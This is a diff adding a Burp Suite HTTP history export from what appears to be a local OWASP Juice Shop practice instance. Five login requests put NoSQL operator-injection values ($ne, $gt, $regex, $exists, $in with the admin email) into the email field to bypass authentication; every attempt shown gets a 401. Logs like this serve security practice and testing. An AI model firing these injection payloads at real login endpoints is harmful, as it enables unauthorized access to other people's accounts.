@@ -1,0 +1,272 @@
+<?xml version="1.1"?>
+<!-- NOTE: Any NULL bytes in requests and responses are preserved within this output, even though this strictly breaks the XML syntax. If your XML parser rejects the NULL bytes then you will need to remove or replace these bytes before parsing. Alternatively, you can use the option to base64-encode requests and responses. -->
+<!DOCTYPE items [
+<!ELEMENT items (item*)>
+<!ATTLIST items burpVersion CDATA "">
+<!ATTLIST items exportTime CDATA "">
+<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
+<!ELEMENT time (#PCDATA)>
+<!ELEMENT url (#PCDATA)>
+<!ELEMENT host (#PCDATA)>
+<!ATTLIST host ip CDATA "">
+<!ELEMENT port (#PCDATA)>
+<!ELEMENT protocol (#PCDATA)>
+<!ELEMENT method (#PCDATA)>
+<!ELEMENT path (#PCDATA)>
+<!ELEMENT extension (#PCDATA)>
+<!ELEMENT request (#PCDATA)>
+<!ATTLIST request base64 (true|false) "false">
+<!ELEMENT status (#PCDATA)>
+<!ELEMENT responselength (#PCDATA)>
+<!ELEMENT mimetype (#PCDATA)>
+<!ELEMENT response (#PCDATA)>
+<!ATTLIST response base64 (true|false) "false">
+<!ELEMENT comment (#PCDATA)>
+]>
+<items burpVersion="2026.4.3" exportTime="Fri Jul 10 00:05:10 IST 2026">
+  <item>
+    <time>Fri Jul 10 00:04:20 IST 2026</time>
+    <url><![CDATA[http://localhost:3000/rest/user/login]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>3000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/rest/user/login]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[POST /rest/user/login HTTP/1.1
+Host: localhost:3000
+Content-Length: 37
+sec-ch-ua-platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Content-Type: application/json
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: */*
+Origin: http://localhost:3000
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:3000/
+Accept-Encoding: gzip, deflate, br
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
+Connection: keep-alive
+
+{"email":{"$ne":null},"password":"x"}]]></request>
+    <status>401</status>
+    <responselength>413</responselength>
+    <mimetype>text</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 401 Unauthorized
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: text/html; charset=utf-8
+Content-Length: 26
+ETag: W/"1a-ARJvVK+smzAF3QQve2mDSG+3Eus"
+Vary: Accept-Encoding
+Date: Thu, 09 Jul 2026 18:34:20 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+Invalid email or password.]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Fri Jul 10 00:04:20 IST 2026</time>
+    <url><![CDATA[http://localhost:3000/rest/user/login]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>3000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/rest/user/login]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[POST /rest/user/login HTTP/1.1
+Host: localhost:3000
+Content-Length: 35
+sec-ch-ua-platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Content-Type: application/json
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: */*
+Origin: http://localhost:3000
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:3000/
+Accept-Encoding: gzip, deflate, br
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
+Connection: keep-alive
+
+{"email":{"$gt":""},"password":"x"}]]></request>
+    <status>401</status>
+    <responselength>413</responselength>
+    <mimetype>text</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 401 Unauthorized
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: text/html; charset=utf-8
+Content-Length: 26
+ETag: W/"1a-ARJvVK+smzAF3QQve2mDSG+3Eus"
+Vary: Accept-Encoding
+Date: Thu, 09 Jul 2026 18:34:20 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+Invalid email or password.]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Fri Jul 10 00:04:21 IST 2026</time>
+    <url><![CDATA[http://localhost:3000/rest/user/login]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>3000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/rest/user/login]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[POST /rest/user/login HTTP/1.1
+Host: localhost:3000
+Content-Length: 40
+sec-ch-ua-platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Content-Type: application/json
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: */*
+Origin: http://localhost:3000
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:3000/
+Accept-Encoding: gzip, deflate, br
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
+Connection: keep-alive
+
+{"email":{"$regex":".*"},"password":"x"}]]></request>
+    <status>401</status>
+    <responselength>413</responselength>
+    <mimetype>text</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 401 Unauthorized
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: text/html; charset=utf-8
+Content-Length: 26
+ETag: W/"1a-ARJvVK+smzAF3QQve2mDSG+3Eus"
+Vary: Accept-Encoding
+Date: Thu, 09 Jul 2026 18:34:21 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+Invalid email or password.]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Fri Jul 10 00:04:21 IST 2026</time>
+    <url><![CDATA[http://localhost:3000/rest/user/login]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>3000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/rest/user/login]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[POST /rest/user/login HTTP/1.1
+Host: localhost:3000
+Content-Length: 41
+sec-ch-ua-platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Content-Type: application/json
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: */*
+Origin: http://localhost:3000
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:3000/
+Accept-Encoding: gzip, deflate, br
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
+Connection: keep-alive
+
+{"email":{"$exists":true},"password":"x"}]]></request>
+    <status>401</status>
+    <responselength>413</responselength>
+    <mimetype>text</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 401 Unauthorized
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: text/html; charset=utf-8
+Content-Length: 26
+ETag: W/"1a-ARJvVK+smzAF3QQve2mDSG+3Eus"
+Vary: Accept-Encoding
+Date: Thu, 09 Jul 2026 18:34:21 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+Invalid email or password.]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Fri Jul 10 00:04:21 IST 2026</time>
+    <url><![CDATA[http://localhost:3000/rest/user/login]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>3000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/rest/user/login]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[POST /rest/user/login HTTP/1.1
+Host: localhost:3000
+Content-Length: 54
+sec-ch-ua-platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Content-Type: application/json
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: */*
+Origin: http://localhost:3000
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:3000/
+Accept-Encoding: gzip, deflate, br
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
+Connection: keep-alive
+
+{"email":{"$in":["admin@juice-sh.op"]},"password":"x"}]]></request>
+    <status>401</status>
+    <responselength>413</responselength>
+    <mimetype>text</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 401 Unauthorized
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: text/html; charset=utf-8
+Content-Length: 26
+ETag: W/"1a-ARJvVK+smzAF3QQve2mDSG+3Eus"
+Vary: Accept-Encoding
+Date: Thu, 09 Jul 2026 18:34:21 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+Invalid email or password.]]></response>
+    <comment></comment>
+  </item>
+</items>
